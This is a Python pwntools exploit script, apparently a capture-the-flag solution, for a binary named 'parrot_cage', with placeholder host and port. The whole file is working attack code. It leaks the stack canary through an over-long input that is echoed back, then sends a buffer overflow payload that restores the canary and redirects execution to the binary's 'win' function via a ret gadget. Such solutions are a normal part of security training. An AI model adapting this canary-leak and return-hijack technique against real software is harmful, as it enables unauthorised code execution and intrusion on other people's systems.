#!/usr/bin/env python3
from pwn import *

exe = ELF('./parrot_cage')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x000000000040101a   # ret — stack alignment

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    r.recvuntil(b"bye' when you're done chatting.")
    r.recv(timeout=0.2)

    # ── leak phase ────────────────────────────────────────────────────────────
    r.send(b'A' * (OFFSET_TO_CANARY + 1))

    leaked       = r.recvline(drop=True)
    canary_bytes = leaked[OFFSET_TO_CANARY + 1:].ljust(7, b'\x00')[:7]
    canary       = u64(b'\x00' + canary_bytes)
    log.success(f'canary = {canary:#x}')

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()